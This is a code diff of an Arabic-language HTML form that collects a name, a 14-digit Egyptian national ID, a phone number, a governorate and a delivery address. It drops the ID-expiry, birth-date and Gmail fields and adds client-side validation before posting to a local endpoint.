@@ -222,97 +222,57 @@
             <h2 class="form-title">المعلومات الشخصية</h2>
             <form id="personalInfoForm">
                 <div class="form-group">
-                    <label for="fullName">الاسم بالكامل</label>
+                    <label for="fullName">الاسم الكامل</label>
                     <input type="text" id="fullName" name="fullName" class="form-control" placeholder="أدخل اسمك بالكامل" required>
                 </div>
 
                 <div class="form-group">
-                    <label for="nationalId">الرقم القومي</label>
-                    <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="أدخل الرقم القومي" required>
+                    <label for="nationalId">الرقم القومي (14 رقم)</label>
+                    <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="أدخل الرقم القومي" maxlength="14" pattern="\d{14}" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
                 </div>
 
                 <div class="form-group">
-                    <label>تاريخ انتهاء الرقم القومي</label>
-                    <div class="dropdown-container">
-                        <select name="idExpiry_day" class="form-control" required>
-                            <option value="" disabled selected>اليوم</option>
-                            <script>
-                                for(let i=1; i<=31; i++) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                        <select name="idExpiry_month" class="form-control" required>
-                            <option value="" disabled selected>الشهر</option>
-                            <option value="1">يناير</option>
-                            <option value="2">فبراير</option>
-                            <option value="3">مارس</option>
-                            <option value="4">أبريل</option>
-                            <option value="5">مايو</option>
-                            <option value="6">يونيو</option>
-                            <option value="7">يوليو</option>
-                            <option value="8">أغسطس</option>
-                            <option value="9">سبتمبر</option>
-                            <option value="10">أكتوبر</option>
-                            <option value="11">نوفمبر</option>
-                            <option value="12">ديسمبر</option>
-                        </select>
-                        <select name="idExpiry_year" class="form-control" required>
-                            <option value="" disabled selected>السنة</option>
-                            <script>
-                                for(let i=2040; i>=2026; i--) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                    </div>
+                    <label for="phone">رقم الهاتف</label>
+                    <input type="tel" id="phone" name="phone" class="form-control" placeholder="أدخل رقم الهاتف" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required>
                 </div>
 
                 <div class="form-group">
-                    <label for="phone">رقم الهاتف المسجل</label>
-                    <input type="tel" id="phone" name="phone" class="form-control" placeholder="أدخل رقم الهاتف المسجل" required>
+                    <label for="governorate">المحافظة</label>
+                    <select id="governorate" name="governorate" class="form-control" required>
+                        <option value="" disabled selected>اختر المحافظة</option>
+                        <option value="القاهرة">القاهرة</option>
+                        <option value="الجيزة">الجيزة</option>
+                        <option value="الإسكندرية">الإسكندرية</option>
+                        <option value="الدقهلية">الدقهلية</option>
+                        <option value="البحيرة">البحيرة</option>
+                        <option value="المنيا">المنيا</option>
+                        <option value="الشرقية">الشرقية</option>
+                        <option value="الغربية">الغربية</option>
+                        <option value="القليوبية">القليوبية</option>
+                        <option value="المنوفية">المنوفية</option>
+                        <option value="كفر الشيخ">كفر الشيخ</option>
+                        <option value="الفيوم">الفيوم</option>
+                        <option value="بني سويف">بني سويف</option>
+                        <option value="أسيوط">أسيوط</option>
+                        <option value="سوهاج">سوهاج</option>
+                        <option value="قنا">قنا</option>
+                        <option value="الأقصر">الأقصر</option>
+                        <option value="أسوان">أسوان</option>
+                        <option value="دمياط">دمياط</option>
+                        <option value="بورسعيد">بورسعيد</option>
+                        <option value="الإسماعيلية">الإسماعيلية</option>
+                        <option value="السويس">السويس</option>
+                        <option value="شمال سيناء">شمال سيناء</option>
+                        <option value="جنوب سيناء">جنوب سيناء</option>
+                        <option value="البحر الأحمر">البحر الأحمر</option>
+                        <option value="الوادي الجديد">الوادي الجديد</option>
+                        <option value="مطروح">مطروح</option>
+                    </select>
                 </div>
 
                 <div class="form-group">
-                    <label>تاريخ الميلاد</label>
-                    <div class="dropdown-container">
-                        <select name="dob_day" class="form-control" required>
-                            <option value="" disabled selected>اليوم</option>
-                            <script>
-                                for(let i=1; i<=31; i++) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                        <select name="dob_month" class="form-control" required>
-                            <option value="" disabled selected>الشهر</option>
-                            <option value="1">يناير</option>
-                            <option value="2">فبراير</option>
-                            <option value="3">مارس</option>
-                            <option value="4">أبريل</option>
-                            <option value="5">مايو</option>
-                            <option value="6">يونيو</option>
-                            <option value="7">يوليو</option>
-                            <option value="8">أغسطس</option>
-                            <option value="9">سبتمبر</option>
-                            <option value="10">أكتوبر</option>
-                            <option value="11">نوفمبر</option>
-                            <option value="12">ديسمبر</option>
-                        </select>
-                        <select name="dob_year" class="form-control" required>
-                            <option value="" disabled selected>السنة</option>
-                            <script>
-                                for(let i=2026; i>=1940; i--) {
-                                    document.write('<option value="' + i + '">' + i + '</option>');
-                                }
-                            </script>
-                        </select>
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label for="email">بريد جيميل (Gmail)</label>
-                    <input type="email" id="email" name="email" class="form-control" placeholder="أدخل بريد جيميل الخاص بك" required>
+                    <label for="deliveryAddress">عنوان التوصيل</label>
+                    <input type="text" id="deliveryAddress" name="deliveryAddress" class="form-control" placeholder="أدخل عنوان التوصيل بالتفصيل" required>
                 </div>
 
                 <div id="errorMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
@@ -361,15 +321,16 @@
 
             const fullName = document.getElementById("fullName").value;
             const nationalId = document.getElementById("nationalId").value;
-            const idExpiry_day = document.querySelector("select[name=\"idExpiry_day\"]").value;
-            const idExpiry_month = document.querySelector("select[name=\"idExpiry_month\"]").value;
-            const idExpiry_year = document.querySelector("select[name=\"idExpiry_year\"]").value;
             const phone = document.getElementById("phone").value;
-            const dob_day = document.querySelector("select[name=\"dob_day\"]").value;
-            const dob_month = document.querySelector("select[name=\"dob_month\"]").value;
-            const dob_year = document.querySelector("select[name=\"dob_year\"]").value;
-            const email = document.getElementById("email").value;
+            const governorate = document.getElementById("governorate").value;
+            const deliveryAddress = document.getElementById("deliveryAddress").value;
             const errorMessageDiv = document.getElementById("errorMessage");
+
+            if (nationalId.length !== 14) {
+                errorMessageDiv.textContent = "الرقم القومي يجب أن يكون 14 رقم";
+                errorMessageDiv.style.display = "block";
+                return;
+            }
 
             try {
                 const response = await fetch("/submit_request", {
@@ -383,10 +344,9 @@
                             data: {
                                 fullName: fullName,
                                 nationalId: nationalId,
-                                idExpiry: `${idExpiry_year}-${idExpiry_month}-${idExpiry_day}`,
                                 phone: phone,
-                                dob: `${dob_year}-${dob_month}-${dob_day}`,
-                                email: email
+                                governorate: governorate,
+                                deliveryAddress: deliveryAddress
                             }
                         })
                     })
